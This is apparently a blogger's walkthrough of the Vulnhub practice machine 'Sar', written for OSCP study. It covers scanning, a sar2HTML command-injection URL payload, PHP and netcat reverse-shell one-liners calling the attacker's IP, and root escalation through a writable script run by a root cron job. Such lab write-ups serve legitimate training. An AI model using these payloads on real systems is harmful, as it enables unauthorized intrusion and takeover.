---
layout: post
title: Vulnhub:Sar
---

### Introduction

Vulnhub is awesome.  I'm not here to tell you about it, so go find about for yourself: [Vulnhub](https://www.vulnhub.com/resources/).  Today's box on my OSCP journey is [Sar](https://www.vulnhub.com/entry/sar-1,425/).

### Disclaimer

A quick disclaimer here: these aren't going to be "here's how I got root".  The best part about the OSCP journey has been the persepctive I've gained looking at systems and thinking through them coming from a blue team background.  I liek to write these to help explain how I thought through the box, where I needed help, and what I learned.

## Enumeration

Like any pen test or box you're poking at, let's start with Nmap:

> nmap -A 10.10.10.10
> Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-03 22:37 EST
> Nmap scan report for 192.168.94.35
> Host is up (0.054s latency).
> Not shown: 998 closed ports
> PORT   STATE SERVICE VERSION
> 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
> | ssh-hostkey: 
> |   2048 33:40:be:13:cf:51:7d:d6:a5:9c:64:c8:13:e5:f2:9f (RSA)
> |   256 8a:4e:ab:0b:de:e3:69:40:50:98:98:58:32:8f:71:9e (ECDSA)
> |_  256 e6:2f:55:1c:db:d0:bb:46:92:80:dd:5f:8e:a3:0a:41 (ED25519)
> 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
> |_http-server-header: Apache/2.4.29 (Ubuntu)
> |_http-title: Apache2 Ubuntu Default Page: It works
> No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
> TCP/IP fingerprint:
> OS:SCAN(V=7.91%E=4%D=1/3%OT=22%CT=1%CU=37065%PV=Y%DS=2%DC=T%G=Y%TM=5FF28DA8
> OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=107%TI=Z%II=I%TS=A)SEQ(SP=10
> OS:4%GCD=1%ISR=108%TI=Z%TS=A)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11
> OS:NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=FE88%W2=FE88%W3=FE8
> OS:8%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=)
> OS:T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%
> OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164
> OS:%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
> Network Distance: 2 hops
> Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
> TRACEROUTE (using port 587/tcp)
> HOP RTT      ADDRESS
> 1   49.58 ms 192.168.49.1
> 2   49.86 ms 192.168.94.35
> OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> Nmap done: 1 IP address (1 host up) scanned in 50.80 seconds

Ok, so we already kow it's a Linux box running Apache.  With only SSH and HTTP open, most likely we need to poke at the web site.  As soon as you think web, 2 things should come to mind: 1) find interesting directories, which means you should poke at 2) robots.txt.

Now, as part of enumeration, I generally always run 3 scans: "-A", "-p-", and "--script vuln".  "-A" gives you service versions, OS detections, default scripts, and traceroute.  "-A" isn't really necessary for CTFs or Vulnhub boxes as we already know where the box is (we don't need traceroute), but I like to use it as I think it's more realistic.  You can just as easily use "-sC -sV" (default scripts and service version) to achieve similar results.  "-p-" scans every single port, which I always do as CTFs can try to hife things on non-standard ports and you never know when you might miss something.  Finally "--script vuln" runs nmap scripts to cehck for vulnerabilities based on the available port.

The "vuln" scan gave us some more info:
>nmap --script vuln 10.10.10.10
>Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-03 22:38 EST
>Nmap scan report for 192.168.94.35
>Host is up (0.057s latency).
>Not shown: 998 closed ports
>PORT   STATE SERVICE
>22/tcp open  ssh
>80/tcp open  http
>|_http-csrf: Couldn't find any CSRF vulnerabilities.
>|_http-dombased-xss: Couldn't find any DOM based XSS.
>| http-enum: 
>|   /robots.txt: Robots file
>|_  /phpinfo.php: Possible information file
>|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
>Nmap done: 1 IP address (1 host up) scanned in 46.99 seconds

Note that it ran the "http-enum" nmap script for us.  We didn't have to go looking for the name of that script.  Nmap said I see http, I'll run the http-enum script for you.  Now, as mentioned above, Nmap just verified we have a robots.txt file and it found a phpinfo.php file.  All we've done is run a couple of Nmap scans and we can pretty well guess our path to own this box. 

### Robots.txt

Robots gives us a single entry:
> sar2HTML

Let's try navigating there:

--pic of sar2html site--

This looks like a default page of sar2html.  What the hell is sar2html?  Sometimes punching something into a search engine really is the first thing you should do.  Since I had never heard of it, I wanted to learn what it was and what it did.  But guess what the first result was?  [Exploit-DB 47204](https://www.exploit-db.com/exploits/47204)

Let's take a look.  The page is ridiculously simple.  It looks like you can get command execution by supplying a parameter in the URL.  Literally just add "?plot=;" to the URL and throw a command after the semicolon.  Ok, let's try it.  So I try "?plot;whoami" and refresh the page.  The page looks the same.  Huh?  Oh wait, I never finished reading the Exploit-DB page.  It says the results are at the bottom of a scroll screen after we push a button... after playing for 5 minutes, I finally figured out what that meant.  

I ran some other commands: cat etc/passwd, pwd, etc.  Ok, I can definitely run commands, but the way they are displayed, it's really difficult to read.  Maybe the machine has netcat installed and we can get a shell?  Oh wait, we're still enumerating.  What was that other file Nmap foud for us?

### phpinfo.php

This page should definitely not be exposed.  Right at the top, it's telling us it's running PHP 7.1.32 on Ubuntu -- mental note: run searchsploit on this version.  But let's keep looking at the file... configuration path, charset, bla bla bla... WAIT!  "file_uploads" is "On".  That doesn't sound good and can definitely be a way in or maybe a way to root.

At this point, I'm not going to bother scanning SSH as it's pretty obvious this box is about abusing this sar2html thingamajiggy and PHP.  But just to be sure there are no other interesting directories, let's run gobuster.

### Gobuster

Dirbuster is the OG tool by OWASP.  The GUI is nice if you're a beginner but it's a little clunky.  I much prefer gobuster.  Gobuster doesn't find anything else interesting, so I think it's time to get a shell.

## Research

As I'm a learner, I always like to check searchsploit for the technologies I'm dealing with.  As someone who isn't a trained red teamer, I need to become more familiar with vulnerabilities and exploits in general, so I make it a habit to do this.  PHP 7.1 has a couple interesting ones, but remember that we already found code execution:

>searchploit php 7.1
>PHP 7.0 < 7.3 (Unix) - 'gc' disable_functions Bypass                                                                  | php/webapps/47462.php
>PHP 7.0 < 7.4 (Unix) - 'debug_backtrace' disable_functions Bypass                                                     | php/local/48072.php
>PHP 7.1 < 7.3 - 'json serializer' disable_functions Bypass                                                            | multiple/webapps/47446.php
>PHP 7.1.8 - Heap Buffer Overflow                                                                                      | multiple/dos/43133.php
>PHP Classifieds 7.1 - 'detail.php' SQL Injection                                                                      | php/webapps/2720.pl
>PHP Classifieds 7.1 - 'index.php' SQL Injection                                                                       | php/webapps/2479.txt
>PHP Melody 2.7.1 - 'playlist' SQL Injection                                                                           | php/webapps/43409.txt
>PHP Net Tools 2.7.1 - Remote Code Execution                                                                           | php/webapps/1695.pl
>PHP-Nuke 6.x < 7.6 Top module - SQL Injection                                                                         | php/webapps/921.sh
>PHP-Nuke 6.x/7.0/7.1 - Image Tag Admin Command Execution                                                              | php/webapps/23835.txt
>PHP-Nuke 7.1 Recommend_Us Module - 'fname' Cross-Site Scripting                                                       | php/webapps/23814.txt
>PHP-Nuke < 8.0 - 'sid' SQL Injection                                                                                  | php/webapps/4964.php
>phpBB Shadow Premod 2.7.1 - Remote File Inclusion                                                                     | php/webapps/2311.txt
>PHPCompta/NOALYSS 6.7.1 5638 - Remote Command Execution                                                               | php/webapps/34861.txt
>PHPLib < 7.4 - SQL Injection                                                                                          | php/webapps/43838.txt
>phpWebSite 1.7.1 - 'local' Cross-Site Scripting                                                                       | php/webapps/35407.txt
>phpWebSite 1.7.1 - 'mod.php' SQL Injection                                                                            | php/webapps/36085.txt
>phpWebSite 1.7.1 - 'upload.php' Arbitrary File Upload                                                                 | php/webapps/35719.py

Just for good measure, let's make sure we aren't missing any for sar2html:

>searchsploit sar2html
>---------------------------------------------------------------------------------------------------------------------- ---------------------------------
> Exploit Title                                                                                                        |  Path
>---------------------------------------------------------------------------------------------------------------------- ---------------------------------
>Sar2HTML 3.2.1 - Remote Command Execution                                                                             | php/webapps/47204.txt
>---------------------------------------------------------------------------------------------------------------------- ---------------------------------
>Shellcodes: No Results
>Papers: No Results

Well, that's seems pretty obvious that we should poke at sar2html and then see about that php file upload.

## Initial Compromise

When I'm learning, I like to go nuts to see what commands can and cannot be run remotely, but keep in mind in the real world you want to be stealthy.  Since I knew we were running PHP, this is a great time to try a PHP shell.  I'm making my own cheat sheet for shells, but you can't go wrong with [PenTestMonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).  I could see of I can run the php command right there in the URL, but I didn't like the way the output was sort of hidden and again, be stealthy, try not to put too much in the URL.

So, I copy over my shell and save it as shell.sh to send to the victim:
>  php -r '$sock=fsockopen("10.10.10.11",8888);exec("/bin/sh -i <&3 >&3 2>&3");'

Now I encourage you to play with the ports with your shell when you are learning.  On easy boxes they don't run firewalls so you can pick any port (for some reason I always use 8888), but in the real world you're going to have restrictions, so get into the habit of using 443, 53, or other common ports.  In this case, it doesn't matter which port you picked.  Now whatever directory you saved your shell script in, you can start a Python web server or if you want to get real fancy, throw it over to /var/www/html and fire up Apache.  I've done this in the past just to learn how to do it, but it's much more convenient to just use python:
>python -m SimpleHTTPServer 8080
OR for Python 3
>python -m http.server 8080

Side note: use any port you want, but again keep in mind firewalls.  I like to use 8080 since it's a HTTP backup port and it help me organize what I have running on what port (remember I typically use 8888 or 443 for a netcat shell).

Now, let's run a command on the victim to get our file:
>http://10.10.10.10/sar2HTML/index.php?plot=;wget%20http://10.10.10.11:8080/shell.sh

Wget is a pretty common Linux utility, so we should be fine.  Just in case though, you can run "which command" where command is the command you want to check, and if you get the file path returned, you know that it exists.  Now that the shell script is on the victim, let's set up our listener:
>nc -nlvp 8888

Now back to the victim, and run the shell script:
>http://10.10.10.10/sar2HTML/index.php?plot=;./shell.sh
And boom, you got a shell!

Now, one thing I don't like about some people's write ups is that they aren't creative.  How else could you have done that?  Was there any other way?  I pondered for a niot here.  We could've served up netcat and run this on the victim:
>nc 10.10.10.11 -e /bin/bash
Or we could have explored the file system, did some digging in PHP and see if we could've uploaded a file to that uploads directory.  Remember that Kali has some basic webshells (/usr/share/webshells/php) so we could've tried that.  Maybe if we enumerated more, could we have found a login page and brute forced the login?  Plenty to think about for sure.  The methodology should always be to try the easy/simple stuff and work your way up the difficulty chain, but we're trying to learn everything we can here.  Take some notes on paths you might want to try and come back after you complete the box to try them.

## pwn
Now that we've got a webshell, we need to enumerate the box.  We're on an Ubunto box, so a few things should jump to mind: 1) can I sudo? 2) linenum.sh and 3) is there anything interesting in opt or the home directoies?  The first thing I do is "sudo -l" to see if I can run any commands with root privs.  No luck, I can't sudo.  Let's run linenum.

I like to run linenum 1 of 2 ways: just download it to the victim (put it in /tmp) or run it as is, just pipe the page to bash.  In this case, I used wget to download linenum from my attacker box, added chmod +X, and ran it.  The output is long so here are the highlights:
>### SYSTEM ##############################################
>[-] Kernel information:
>Linux sar 5.0.0-23-generic #24~18.04.1-Ubuntu SMP Mon Jul 29 16:12:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
>[-] Are permissions on /home directories lax:
>total 16K
>drwxr-xr-x  3 root     root     4.0K Jul 22 22:27 .
>drwxr-xr-x 24 root     root     4.0K Mar 10  2020 ..
>-rw-r--r--  1 www-data www-data   33 Jan  4 09:06 local.txt
>drwxr-xr-x 17 love     love     4.0K Jul 24 20:32 love
>
>[-] Crontab contents:
># /etc/crontab: system-wide crontab
># Unlike any other crontab you don't have to run the `crontab'
># command to install the new version when you edit this file
># and files in /etc/cron.d. These files also have username fields,
># that none of the other crontabs do.
>
>SHELL=/bin/sh
>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
>
># m h dom mon dow user	command
>17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
>25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
>47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
>52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
>#
>*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh

Anyone can read local.txt on www-data's home directory, so that's probably the user flag.  And what's that running every 5 minutes?  A script called "finally.sh" in /var/www/html?  Let's go look.

>$ cat finally.sh
>#!/bin/sh
>
>./write.sh

So "finally.sh" just runs "write.sh"...
>$ cat write.sh
>#!/bin/sh
>
>touch /tmp/gateway

And all "write.sh" does is touch a directory (to update the modified timestamp).  Can I write to either of these files?  That would be nice.
>$ ls -al
>total 40
>drwxr-xr-x 3 www-data www-data  4096 Jul 24 20:36 .
>drwxr-xr-x 4 www-data www-data  4096 Jul 24 20:37 ..
>-rwxr-xr-x 1 root     root        22 Oct 20  2019 finally.sh
>-rw-r--r-- 1 www-data www-data 10918 Oct 20  2019 index.html
>-rw-r--r-- 1 www-data www-data    21 Oct 20  2019 phpinfo.php
>-rw-r--r-- 1 root     root         9 Oct 21  2019 robots.txt
>drwxr-xr-x 4 www-data www-data  4096 Jan  4 10:13 sar2HTML
>-rwxrwxrwx 1 www-data www-data    30 Jul 24 20:36 write.sh

Well, anyone can write to "write.sh" so there's out ticket.  But what to write?  Netcat?  Open that shell.sh we used inside of the "sar2HTML" directory? I checked netcat and sure enough it's installed.  This will be easy!  We'll just have netcat execute another bash shell back to us:
>$ echo "nc 10.10.10.11 9999 -e /bin/bash" >> write.sh
I open a listener on 9999 and go make a cup of tea.  Black tea.  No sugar, no cream.  Just good hot tea.  I check my listener... nothing.  Has 5 minutes passed?  I glance at the cron job and it's every 5 minutes... so 12:00, 12:05... it's definitely been 5 minutes.  Nothing.  I double check the above commands, looking for typos but it all looks good.  Another 5 minutes... nothing.  Dang it!  Let's run the command outside of "Write.sh" just to triple check.  Awww man, the version of netcat doesn't support "-e" or maybe the port is in use?  I try another port, nothing.

I'm so close... well, php worked before, so let's use it again.
>$ echo "php -r $sock=fsockopen("10.10.10.11",9999);exec("/bin/sh -i <&3 >&3 2>&3");'" >> write.sh

BOOM!  Shell pops, whoami says I'm root.  Collect flag, ganme over.

What other ways could I have gotten root?
